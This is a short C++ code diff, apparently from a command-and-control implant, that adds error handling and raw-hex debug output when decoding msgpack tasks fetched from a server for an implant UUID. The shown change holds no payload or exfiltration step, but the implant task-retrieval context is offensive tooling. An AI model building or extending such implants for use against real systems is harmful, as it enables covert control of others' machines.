@@ -129,7 +129,25 @@ nlohmann::json get(std::string implant_uuid) {
 
         // --- End Reverse Transforms for Server output ---
 
-        return decode_msgpack_task(http_response_buffer);
+        try {
+            nlohmann::json result = nlohmann::json::from_msgpack(http_response_buffer);
+            return result;
+        }
+        catch (nlohmann::json::parse_error& e) {
+            std::cerr << "JSON Parse Error: " << e.what() << std::endl;
+            std::cerr << "Byte position of error: " << e.byte << std::endl;
+            
+            // PRINT THE RAW HEX to see what you actually received
+            std::cerr << "Raw Buffer (Hex): ";
+            for (auto byte : http_response_buffer) {
+                printf("%02X ", (unsigned char)byte);
+            }
+            std::cout << std::endl;
+            
+            return nlohmann::json(); // Return null json to prevent crash
+        }
+
+        //return decode_msgpack_task(http_response_buffer);
     }
 
     return nullptr;
